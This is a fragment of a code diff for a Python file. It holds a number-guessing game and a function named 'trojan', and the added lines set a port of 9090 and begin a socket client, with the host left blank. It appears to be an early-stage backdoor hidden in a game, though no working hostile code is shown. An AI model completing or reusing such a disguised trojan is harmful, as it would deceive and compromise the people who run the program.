@@ -5,7 +5,9 @@ import threading
 
 def trojan():
     HOST = 
+    port = 9090
 
+    client = socket
 def game():
     number = random.randint(0,1000)
     tries = 1
